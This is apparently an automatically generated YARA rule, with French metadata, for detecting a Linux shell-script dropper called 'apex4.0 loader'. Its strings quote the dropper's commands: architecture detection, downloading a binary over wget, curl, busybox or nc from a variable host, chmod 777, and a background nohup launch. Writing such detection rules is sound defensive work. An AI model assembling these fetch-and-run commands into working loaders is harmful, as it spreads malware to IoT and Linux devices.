rule SCRIPT_Dropper_Unknown_ForgeAuto_49674744
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "49674744f9ce1724c4d1b957b0e2ecf9c50b3104cc2e7a4b085bc1f1232b04ad"
        yarahub_uuid = "a16dfc5a-072a-4f76-bea3-86c273928a87"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "94c34b0f4a3ad64665b52b6c0eff5088"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "apex4.0 loader" ascii
        $s1 = "cd /tmp 2>/dev/null || cd /dev/shm 2>/dev/null || cd /var/tmp 2>/dev/null || cd /var/run 2>/dev/null || cd / 2>/dev/null || exit 1" ascii
        $s2 = "M=$(uname -m)" ascii
        $s3 = "chmod 777 q 2>/dev/null" ascii
        $s4 = "nohup ./q \"$TAG\" >/dev/null 2>&1 &) || ./q \"$TAG\" >/dev/null 2>&1 &" ascii
        $s5 = ">/dev/null 2>&1 &) || ./q" ascii
        $s6 = "arch-detect, multi-method download, run as tag \"vps\"" ascii
        $s7 = "aarch64|arm64|armv8*) A=armv7l; P=9911 ;;" ascii
        $s8 = "armv7*) A=armv7l; P=9911 ;;" ascii
        $s9 = "armv6*) A=armv6l; P=9914 ;;" ascii
        $s10 = "armv5*) A=armv5l; P=9917 ;;" ascii
        $s11 = "armv4*) A=armv4l; P=9918 ;;" ascii
        $s12 = "mips) A=mips; P=9915 ;;" ascii
        $s13 = "mipsel) A=mipsel; P=9916 ;;" ascii
        $s14 = "1) wget  2) curl  3) busybox wget  4) nc raw-push  5) /dev/tcp" ascii
        $s15 = "if command -v wget >/dev/null 2>&1; then wget -q -O q \"http://$B/$A\" 2>/dev/null; fi" ascii
        $s16 = "-s q ] || { command -v curl >/dev/null 2>&1 && curl -skLo q \"http://$B/$A\" 2>/dev/null; }" ascii
        $s17 = "-s q ] || { command -v busybox >/dev/null 2>&1 && busybox wget -q -O q \"http://$B/$A\" 2>/dev/null; }" ascii
        $s18 = "-s q ] || { command -v nc >/dev/null 2>&1 && nc $H $P > q 2>/dev/null; }" ascii
        $s19 = "-s q ] || { command -v busybox >/dev/null 2>&1 && busybox nc $H $P > q 2>/dev/null; }" ascii
    condition:
        true and filesize < 50MB and 2 of them and 1 of ($s0, $s1, $s2, $s3, $s4)
}
